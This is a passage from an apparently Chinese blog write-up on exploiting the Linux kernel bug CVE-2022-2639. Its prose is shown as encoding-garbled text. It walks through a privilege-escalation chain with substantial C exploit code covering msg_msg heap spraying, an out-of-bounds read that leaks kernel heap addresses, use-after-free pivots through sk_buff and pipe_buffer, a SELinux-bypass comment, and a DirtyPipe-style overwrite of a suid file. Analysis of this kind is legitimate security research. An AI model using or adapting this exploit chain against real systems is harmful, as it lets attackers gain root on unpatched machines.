<p>æ¥ç€ spray <code>struct msg_msg</code>ï¼Œæ¯ä¸ª msg åŒ…å«ä¸€ä¸ª 0x1000 çš„ <code>struct msg_msg</code> å’Œä¸€ä¸ª 0x400 çš„ <code>struct msg_msgseg</code> ã€‚ç”±äºç¬¬ä¸€æ­¥å·²ç»å°† order å°çš„ slab éƒ½è€—å°½äº†ï¼Œæ­¤æ—¶åˆ†é…çš„ 0x1000 çš„ slab å’Œ 0x400 çš„ slab å¤§æ¦‚ç‡åˆä¼šä»æ­¤æ—¶å¤„åœ¨ freelist ä¸­çš„ order-4  çš„ 0x10000 çš„ slab åˆ†å‰²ï¼Œç›´åˆ°åˆ†å‰²åˆ° order-0ï¼Œåˆ†åˆ«ç»™è¿™ä¸¤ä¸ªæ¶ˆæ¯ç»“æ„ä½¿ç”¨ã€‚è¿™æ ·çš„è¯ï¼Œä¹‹å‰æ²¡é‡Šæ”¾çš„ <code>rx_ring buffer</code> çš„åé¢ï¼Œå¤§æ¦‚ç‡å°±ä¼šç´§æŒ¨ä¸€ä¸ª <code>struct msg_msg</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶å †ä¸­çš„å¸ƒå±€å¤§æ¦‚æ˜¯ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-2.png"></p>
<p>ç„¶åæŠŠåˆšæ‰åœ¨ order-4 ä¸­ç•™ä¸‹çš„å¦ä¸€åŠ 0x10000 ç»™é‡Šæ”¾æ‰ï¼Œæ­¤æ—¶åˆå› ä¸ºå…ˆå‰é‡Šæ”¾çš„ 0x10000 éƒ½è¢« <code>msgã€msgseg</code> å é¢†æˆ–è€…ä»¥å…¶ä»–è¢«åˆ‡å‰²åçš„å¤§å°å­˜åœ¨çš„ freelist ä¸­ï¼Œä¾ç„¶ä¸ä¼šå‘ä¸Šåˆå¹¶ã€‚æ‰€ä»¥æ­¤æ¬¡é‡Šæ”¾çš„ 0x10000 ä¹Ÿéƒ½ä¼šå­˜åœ¨ freelist ä¸­ã€‚æ­¤æ—¶å¸ƒç½®èƒ½åœ¨ 0x10000 çš„ slab ä¸­å‘ç”Ÿæº¢å‡ºçš„æ¼æ´å¯¹è±¡ï¼Œä»è€Œå¯ä»¥è¶Šç•Œè¦†å†™åˆ°ç›¸é‚»çš„ <code>struct msg_msg</code> çš„ <code>m_ts</code> å­—æ®µï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ <code>msg_msg</code> æ¥è¶Šç•Œè¯»æ³„éœ² 0x400 çš„è¾…åŠ©æ¶ˆæ¯åé¢çš„æ•°æ®ï¼Œæš‚ä¸”ç§°è¯¥ <code>msg_msg</code> ä¸º <text style="color:green">msg1</text>ï¼Œ<text style="color:green">msg1</text> å¯ä»¥é€šè¿‡ <code>msgrcv</code> çš„è¿”å›å€¼ä¸è¶Šç•Œä¿®æ”¹çš„ <code>m_ts</code> çš„å€¼æ˜¯å¦ç›¸ç­‰æ¥ç¡®å®šã€‚æ­¤æ—¶çš„å¤§æ¦‚å¸ƒå±€ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-3.png"></p>
<p>ç”±äºåœ¨ç”³è¯· 0x400 çš„ <code>msg_msgseg</code> æ—¶ï¼Œè¯¥ slab å¤§æ¦‚ç‡æ²¡æœ‰ä¸ºå…¶ä»–ä»»åŠ¡åˆ†é…å †å—ï¼Œæ‰€ä»¥å‡ ä¹ <code>msg_msgseg</code> åé¢éƒ½æ˜¯å¦ä¸€ä¸ª <code>msg_msg</code> çš„ <code>msg_msgseg</code>ï¼Œåœ¨å‘é€æ¶ˆæ¯ä¹Ÿå°±æ˜¯åˆ›å»ºè¿™äº› <code>msg_msg</code> çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥<strong>åœ¨æ¶ˆæ¯ä¸­å¯¹è¯¥ <code>msg</code> è¿›è¡Œä¸€ä¸ªæ ‡è¯†ï¼Œè¿™æ ·å°±èƒ½ç¡®å®šä»»ä½•ä¸€ä¸ªæ¶ˆæ¯</strong>ã€‚å¯ä»¥åˆ©ç”¨ <text style="color:green">msg1</text> ï¼Œé€šè¿‡ <code>msgrcv</code> æ¥æ”¶æ¶ˆæ¯ä½†æ˜¯è®¾ç½® <code>MSG_COPY</code> è¯»å–åˆ°åé¢ <code>msg_msgseg</code> çš„æ ‡è¯†ï¼Œå‡è®¾è¢«è¯»å–çš„ <code>msg_msgseg</code> å±äº <text style="color:green">msg2</text>ï¼›é€šè¿‡ä¸å¸¦ <code>flag</code> çš„ <code>msgrcv</code> æ¥è¯»å– <text style="color:green">msg2</text>ï¼Œæ­¤æ—¶å°±é‡Šæ”¾äº† 0x1000 çš„ <code>msg_msg</code> å’Œè¯¥ 0x400 çš„ <code>msg_msgseg</code> ã€‚<strong>æ­¤æ—¶å†æ¬¡ spray å¤šä¸ª 0x400 çš„ <code>msg_msg</code>å½¢æˆä¸€ä¸ª <code>msg</code> é˜Ÿåˆ—ï¼Œå»å ç”¨åˆšåˆšé‡Šæ”¾çš„ msg_msgseg</strong>ï¼Œé˜Ÿåˆ—ç¤ºæ„å¦‚ä¸‹ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-4.png"></p>
<p>å…·ä½“ exp ä¸­çš„åšæ³•æ˜¯ä¿ç•™ <text style="color:green">msg1</text> çš„ <code>msqid</code> åœ¨ <code>list1_corrupted_msqid</code> ä¸­ï¼Œç„¶åé€šè¿‡ <code>msgget</code> æ”¹å˜å…¶åœ¨ <code>msqid[]</code>  ä¸­çš„å€¼ï¼Œé¿å… [3-7] å°†è¯¥ <text style="color:green">msg1</text> ä¹Ÿé‡Šæ”¾æ‰ï¼›ç„¶ååˆ¤æ–­ä¸€ä¸‹è¶Šç•Œè¯»åˆ°çš„å†…å­˜æ˜¯ä¸æ˜¯ <code>msg_msgseg</code>ï¼Œæ¥ç€å°†é™¤ <text style="color:green">msg1</text> ä»¥å¤–çš„å…¶ä»–æ¶ˆæ¯éƒ½é‡Šæ”¾æ‰ï¼Œè‡ªç„¶åŒ…æ‹¬äº†ä¸Šè¿°çš„ <text style="color:green">msg2</text>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">    <span class="type">ssize_t</span> copy_size = msgrcv(msqid_1[i], msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">    <span class="keyword">if</span> (copy_size &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_size == MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>)) &#123; </span><br><span class="line">        logi(<span class="string">&quot;[+] corrupted msg_msg found, id: %d&quot;</span>, msqid_1[i]);</span><br><span class="line">        list1_corrupted_msqid = msqid_1[i];</span><br><span class="line">        msqid_1[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line">        <span class="type">uint64_t</span> *oob_data = (<span class="type">uint64_t</span> *)(msg_a_oob-&gt;mtext + MSG_A_TEXT_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;oob_data[<span class="number">1</span>], <span class="string">&quot;QQQQQQQQ&quot;</span>, <span class="number">8</span>))</span><br><span class="line">            logd(<span class="string">&quot;[-] but the next object is not allocated by msg_msgseg&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (list1_corrupted_msqid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    loge(<span class="string">&quot;[-] can&#x27;t find corrupted msg_msg, and kernel may crash :(&quot;</span>);</span><br><span class="line">    clean_msq1();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-7] free all uncorrupted msg_msg ...&quot;</span>);</span><br><span class="line">clean_msq1();</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-8] alloc 0x400*16 `msg_msg` chain to re-acquire the 0x400 slab freed by msg_msgseg ...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_2; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(msg_b-&gt;mtext, <span class="string">&#x27;w&#x27;</span>, MSG_B_TEXT_SIZE);</span><br><span class="line">    ((<span class="type">int</span> *)msg_b-&gt;mtext)[<span class="number">0</span>] = MSG_SIG;</span><br><span class="line">    ((<span class="type">int</span> *)msg_b-&gt;mtext)[<span class="number">1</span>] = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++) &#123;</span><br><span class="line">        msg_b-&gt;mtype = MTYPE_B | (j &lt;&lt; <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid_2[i], msg_b, MSG_B_TEXT_SIZE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            die(<span class="string">&quot;0x400 * 0x10 * NUM_MSQIDS_2 msgsnd() failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å¤§æ¦‚å †å¸ƒå±€ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-5.png"></p>
<p><code>MTYPE_B | (j &lt;&lt; 8)</code> çš„ç›®çš„æ˜¯åé¢ä¸ºäº†ç¡®å®šè¶Šç•Œè¯»åˆ°çš„ <code>msg_msg</code> æ˜¯ç¬¬ä¸€æ¡æ¶ˆæ¯è¿˜æ˜¯åé¢çš„æ¶ˆæ¯ï¼Œæ¥å†³å®šè¯»å– <code>m_next</code> æŒ‡é’ˆè¿˜æ˜¯ <code>m_prev</code> æŒ‡é’ˆã€‚</p>
<p>è§¦å‘æ¼æ´è¶Šç•Œè¦†å†™çš„æ•°æ®å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> vuln_buf[] = &#123;</span><br><span class="line">    <span class="number">0</span>,                                     <span class="comment">// m_list.next</span></span><br><span class="line">    <span class="number">0</span>,                                     <span class="comment">// m_list.prev</span></span><br><span class="line">    MTYPE_A,                               <span class="comment">// m_type</span></span><br><span class="line">    MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="comment">// m_ts</span></span><br><span class="line">&#125;;</span><br><span class="line">trigger_vuln(&amp;vuln_buf, <span class="keyword">sizeof</span>(vuln_buf));</span><br></pre></td></tr></table></figure>

<p><code>m_ts</code> è¦†å†™ä¸ºå¤šè¯»ä¸€ä¸ª <code>msg_msgseg</code> çš„å¤§å°ã€‚</p>
<p>å‡è®¾æ­¤æ—¶å ä½æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å†æ¬¡åˆ©ç”¨ <text style="color:green">msg1</text> è¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±ä¼šè¯»åˆ° msgB çš„ <code>m_next</code> æŒ‡é’ˆï¼Œä»è€Œ<strong>å¾—åˆ° <text style="color:red">msgC</text> çš„åœ°å€</strong>ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-6.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> copy_size = msgrcv(list1_corrupted_msqid, msg_a_oob, MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>), <span class="number">0</span>, MSG_COPY | IPC_NOWAIT);</span><br><span class="line"><span class="keyword">if</span> ((copy_size &lt; <span class="number">0</span>) || (copy_size != MSG_TEXT_SIZE(MSG_A_RAW_SIZE + <span class="number">0x400</span>))) </span><br><span class="line">    die(<span class="string">&quot;[-] recv from corrupted msg_msg failed&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *oob_data = (<span class="type">uint64_t</span> *)(msg_a_oob-&gt;mtext + MSG_A_TEXT_SIZE);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> msg_msg *)oob_data;</span><br><span class="line"><span class="keyword">if</span> (((<span class="type">int</span> *)&amp;p-&gt;mtext)[<span class="number">0</span>] != MSG_SIG) &#123;</span><br><span class="line">    loge(<span class="string">&quot;[-] bad luck, we don&#x27;t catch 0x400 msg_msg&quot;</span>);</span><br><span class="line">    clean_msq2();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">logd(<span class="string">&quot;[+] it works :)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// list2_leak_msqid â€”â€” the msg_msg with kmalloc-0x400 address</span></span><br><span class="line">list2_leak_msqid = msqid_2[((<span class="type">int</span> *)&amp;p-&gt;mtext)[<span class="number">1</span>]];</span><br><span class="line">list2_leak_mtype = p-&gt;m_type;</span><br><span class="line">list2_leak_security = p-&gt;security;</span><br><span class="line"><span class="keyword">if</span> (list2_leak_mtype &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">    list2_uaf_msg_addr = p-&gt;m_list.prev;</span><br><span class="line">    list2_uaf_mtype = p-&gt;m_type - <span class="number">0x100</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    list2_uaf_msg_addr = p-&gt;m_list.next; <span class="comment">// first msg_msg</span></span><br><span class="line">    list2_uaf_mtype = p-&gt;m_type + <span class="number">0x100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logd(<span class="string">&quot;[3-10] free all uncorrupted msg_msg ...&quot;</span>);</span><br><span class="line">clean_msq2();</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-7.png"></p>
<p>æ­¤æ—¶å¾—åˆ°äº†ä¸€ä¸ª 0x400 çš„ slab çš„åœ°å€ã€‚å¹¶ä¸”ç”±äºä¸Šè¿°æ”»å‡»å®Œæˆåå°† <code>msqid1ã€msqid2</code> ä¸­é™¤äº†ä¸¤ä¸ªç”¨åˆ°çš„ <code>msg_msg</code> éƒ½é‡Šæ”¾æ‰äº†ï¼Œå¾ˆå¤š slab éƒ½ä¼šé‡æ–°å›åˆ° freelist å¹¶ä¸”éƒ¨åˆ†ä¼šå‘ç”Ÿå‘ä¸Šåˆå¹¶çš„æƒ…å†µã€‚<strong>æ­¤æ—¶ä¸¤ä¸ªè¿˜åœ¨ç”¨åˆ°çš„åˆ†åˆ«æ˜¯ä¸€ä¸ªè¢«ç¯¡æ”¹äº† <code>m_ts</code> çš„ <text style="color:green">msg1</text> å’Œæœ‰0x10ä¸ª <code>msg_msg</code> æ¶ˆæ¯çš„é˜Ÿåˆ— <code>list2_leak_msqid</code>ï¼Œè¶Šç•Œç›´æ¥è¯»çš„ msgB å’Œæ‹¿åˆ°åœ°å€çš„ <text style="color:red">msgC</text> éƒ½å±äºè¯¥é˜Ÿåˆ—ã€‚</strong></p>
<h2 id="exploit-2ï¼šæ„é€ -DirtyPipe"><a href="#exploit-2ï¼šæ„é€ -DirtyPipe" class="headerlink" title="exploit-2ï¼šæ„é€  DirtyPipe"></a>exploit-2ï¼šæ„é€  DirtyPipe</h2><p>æ‹¿åˆ°ä¸€ä¸ªæ­£åœ¨ä½¿ç”¨çš„ <code>msg_msg</code> å †åœ°å€ï¼Œè€ƒè™‘åˆ¶é€  UAFã€‚å‰é¢å‡ æ­¥ä¸ exploit-1 çš„å‰å‡ æ­¥ä¸€æ ·ï¼Œç›´åˆ°è§¦å‘æ¼æ´æ—¶ï¼Œç›´æ¥æº¢å‡ºè¦†å†™ <code>struct msg_msg</code> çš„ <code>m_next</code> æŒ‡é’ˆä¸ºåˆšæ‰å¾—åˆ°æ­£åœ¨ç”¨çš„ 0x400 çš„ <code>struct msg_msg</code> å³ <text style="color:red">msgC</text>ï¼Œæš‚ä¸”ç§°è¢«æº¢å‡ºè¦†å†™çš„<code>struct msg_msg</code>ä¸º msgAï¼Œæ­¤æ—¶çš„ <code>msg_msg</code> å…³ç³»å¦‚å›¾ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-8.png"></p>
<p>æ­¤æ—¶ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å­˜ã€‚uaf å·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ã€‚</p>
<p>æ¥ä¸‹æ¥å…ˆé‡Šæ”¾æ‰åœ¨ exploit-1 ä¸­ä¿ç•™çš„ <code>list2_leak_msqid</code> ï¼ŒmsgB å’Œ <text style="color:red">msgC</text> æ‰€åœ¨çš„é“¾å¹¶æœªè¢«ç ´åï¼Œunlink ä¸€åˆ‡æ­£å¸¸ï¼Œæ­¤æ—¶ msgA çš„ <code>m_next</code> æŒ‡å‘äº†ä¸€å—å·²ç»é‡Šæ”¾çš„å†…å­˜ã€‚<strong>å¾—åˆ°äº†ä¸€ä¸ª 0x400 slab çš„ UAFã€‚</strong>æ­¤æ—¶å¸ƒå±€å¤§æ¦‚å¦‚ä¸‹ï¼ˆBæ­¤æ—¶ä¹Ÿæ˜¯ freed çš„çŠ¶æ€äº†ï¼‰ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-9.png"></p>
<p>ç„¶å spray sk_buffï¼ˆæœ¬æ–‡ä¸­ä½¿ç”¨çš„ç»“æ„åœ¨<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#">arttnba3 å¸ˆå‚…çš„åšå®¢</a>ä¸­éƒ½æœ‰è¯¦ç»†è¯´æ˜ï¼‰ï¼Œå¤§æ¦‚ç‡ä¼šæœ‰ä¸€ä¸ªæˆåŠŸå ç”¨ <text style="color:red">msgC</text> çš„ slabã€‚ç”±äº sk_buff-&gt;data ç»“æ„ä½“å‰é¢çš„æ•°æ®å‡å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªåˆæ³•çš„ msg header ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> msg_msg *)buff;</span><br><span class="line">p-&gt;m_list.next = list2_uaf_msg_addr;</span><br><span class="line">p-&gt;m_list.prev = list2_uaf_msg_addr;</span><br><span class="line">p-&gt;m_ts = <span class="number">0x100</span>;</span><br><span class="line">p-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">p-&gt;next = <span class="number">0</span>;</span><br><span class="line">p-&gt;security = list2_leak_security; <span class="comment">// bypass selinux</span></span><br><span class="line">spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-10.png"></p>
<p>æ­¤æ—¶æˆ‘ä»¬å†é€šè¿‡ msgA æ‰€åœ¨é˜Ÿåˆ—å°† sk_buff-&gt;data æ‰€åœ¨çš„ slab é‡Šæ”¾ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ª sk_buff-&gt;data çš„ UAFï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-8] free sk_buff-&gt;data using fake msqid&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid_1[i], msg_b, MSG_B_TEXT_SIZE, MTYPE_FAKE, IPC_NOWAIT) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        logd(<span class="string">&quot;[+] freed using msqid %d&quot;</span>, i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-11.png"></p>
<p>ç„¶åå†å †å–· <code>struct pipe_buffer</code>ï¼Œç”±äºåˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ï¼ˆ0x400ï¼‰ä¸­å–å‡ºä¸€ä¸ª objectã€‚æ­¤æ—¶å¤§æ¦‚ç‡ä¼š<strong>æœ‰è¿ç»­çš„ <code>pipe buffer</code> å’Œ sk_buff-&gt;data å…±ç”¨ä¸€ä¸ªslab</strong>ã€‚åŒæ—¶æ“ä½œpipeï¼Œæ‰“å¼€ç›®æ ‡ suid æ–‡ä»¶ï¼Œå¹¶åšå¥½ splice æ“ä½œï¼š</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-9] spray 0x100 pipe_buffer to re-acquire the 0x400 slab freed by sk_buff-&gt;data&quot;</span>);</span><br><span class="line"><span class="type">int</span> attack_fd = open(ATTACK_FILE, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (attack_fd &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] open %s: %m&quot;</span>, ATTACK_FILE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipes[i])) die(<span class="string">&quot;[-] alloc pipe failed.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], buff, <span class="number">0x100</span> + i);</span><br><span class="line"></span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = splice(attack_fd, &amp;offset, pipes[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) die(<span class="string">&quot;[-] splice() failed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/2-12.png"></p>
<p>æ­¤æ—¶å†<strong>æ²¿ç€å‘é€çš„è·¯å¾„æ¥æ”¶è¯¥åŒ…å°±èƒ½å°† sk_buff-&gt;data é‡Šæ”¾æ‰ï¼ŒåŒæ—¶æ³„éœ²äº†æ•´ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“</strong>ï¼Œæ­¤æ—¶å°±ä» sk_buff-&gt;data çš„ UAF è½¬åŒ–ä¸º <code>pipe_buffer</code> çš„ UAFï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">logd(<span class="string">&quot;[4-10] free sk_buff-&gt;data to make pipe_buffer become UAF&quot;</span>);</span><br><span class="line"><span class="type">int</span> uaf_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">char</span> pipe_buffer_backup[<span class="number">0x280</span>];</span><br><span class="line"><span class="type">int</span> PIPE_BUF_FLAG_CAN_MERGE = <span class="number">0x10</span>;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">    <span class="type">uint64_t</span> size = <span class="number">0x400</span> - <span class="number">0x140</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sock_pairs[i][<span class="number">1</span>], ptr, size) &lt; <span class="number">0</span>)</span><br><span class="line">                die(<span class="string">&quot;[-] read from sock pairs failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ptr[<span class="number">1</span>].len == <span class="number">1</span> &amp;&amp; ptr[<span class="number">1</span>].offset == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(pipe_buffer_backup, ptr, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line">                uaf_pipe_idx = ptr[<span class="number">0</span>].len &amp; <span class="number">0xff</span>;</span><br><span class="line">                logi(<span class="string">&quot;[+] uaf_pipe_idx: %d&quot;</span>, uaf_pipe_idx);</span><br><span class="line">                <span class="keyword">goto</span> out1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºåœ¨å‘é€çš„æ—¶å€™ <code>write(pipes[i][1], buff, 0x100 + i)</code>ï¼Œå†™åœ¨äº†æ¯ä¸ª<code>pipe</code>çš„ç¬¬ä¸€ä¸ª <code>pipe_buffer</code>çš„ page ä¸­ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ª<code>pipe_buffer</code> çš„ <code>len</code> å³ä¸º  0x100 + iï¼Œé‚£ä¹ˆ &amp; 0xff å°±èƒ½å¾—åˆ°æ˜¯å“ªä¸ª <code>pipe</code> äº†ã€‚<code>ptr[1].len == 1 &amp;&amp; ptr[1].offset == 1</code> åˆ™æ˜¯å› ä¸ºå‰é¢çš„ <code>splice()</code> å†™åœ¨ç¬¬äºŒä¸ª <code>pipe_buffer</code> çš„ä¸­ï¼Œå…¶ page æŒ‡å‘äº† page_cacheï¼Œ<code>len</code> å’Œ <code>offset</code> éƒ½æ˜¯ <code>splice()</code> ä¼ å…¥çš„å‚æ•°æŒ‡å®šã€‚</p>
<p><img src="/img/CVE-2022-2639/2-13.png"></p>
<h2 id="exploit-3ï¼šæƒé™æå‡"><a href="#exploit-3ï¼šæƒé™æå‡" class="headerlink" title="exploit-3ï¼šæƒé™æå‡"></a>exploit-3ï¼šæƒé™æå‡</h2><p>åˆ°æ­¤æ—¶ä¸ºæ­¢ï¼Œ<strong>æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ª <code>pipe_buffer</code> çš„ UAF</strong>ã€‚ä¸ç”¨æ³„éœ² <code>ops</code> å­—æ®µå®Œæˆä¼ ç»Ÿçš„ ROPï¼Œç›´æ¥ä¿®æ”¹ flagsï¼è½¬åŒ–ä¸ºç±»ä¼¼ DirtyPipe çš„åœºæ™¯ã€‚<strong>è‡ªä»DirtyPipeè¢«ä¿®å¤åï¼Œä½¿ç”¨ <code>splice()</code> æ—¶flagsä¼šè¢«é‡æ–°è®¾ç½®ä¸º0ï¼Œè€Œæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯å°†è¿™ä¸ª flags å†æ¬¡ä¿®æ”¹ä¸º <code>PIPE_BUF_FLAG_CAN_MERGE</code>ã€‚</strong>ä»è€Œå®Œæˆä»»æ„æ–‡ä»¶ä¿®æ”¹ï¼Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„ã€‚è¿™ä¸€æ­¥è¿˜æ˜¯ spray sk_buffï¼ˆä»å¤´å¼€å§‹å°±å¯ä»¥ fake ç®€ç›´ä¸è¦å¤ªå¥½ç”¨ï¼ï¼‰ï¼Œå¤§æ¦‚ç‡å…¶ä¸­ä¸€ä¸ªä¼šå ç”¨è¿™ä¸ª<code>pipe</code> çš„ <code>pipe_buffer</code>ï¼Œä¿®æ”¹ flagsï¼Œlenã€offsetï¼ˆä¸ºäº†å®Œæˆä»å¤´å†™ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buff, <span class="number">0</span>, <span class="keyword">sizeof</span>(buff));</span><br><span class="line"><span class="built_in">memcpy</span>(buff, pipe_buffer_backup, <span class="keyword">sizeof</span>(pipe_buffer_backup));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">typ_pipe_buffer</span> *<span class="title">ptr</span> =</span> (<span class="keyword">struct</span> typ_pipe_buffer *)buff;</span><br><span class="line">ptr[<span class="number">1</span>].flags = PIPE_BUF_FLAG_CAN_MERGE; <span class="comment">// for kernel &gt;= 5.8</span></span><br><span class="line">ptr[<span class="number">1</span>].len = <span class="number">0</span>;</span><br><span class="line">ptr[<span class="number">1</span>].offset = <span class="number">0</span>;                      <span class="comment">// offset = 0</span></span><br><span class="line">ptr[<span class="number">1</span>].ops = ptr[<span class="number">0</span>].ops;                <span class="comment">// for kernel &lt; 5.8</span></span><br><span class="line">spray_skbuff_data(buff, <span class="number">0x400</span> - <span class="number">0x140</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å…·ä½“å¯ä»¥å‚è€ƒ <a href="https://github.com/veritas501/pipe-primitive">https://github.com/veritas501/pipe-primitive</a></p>
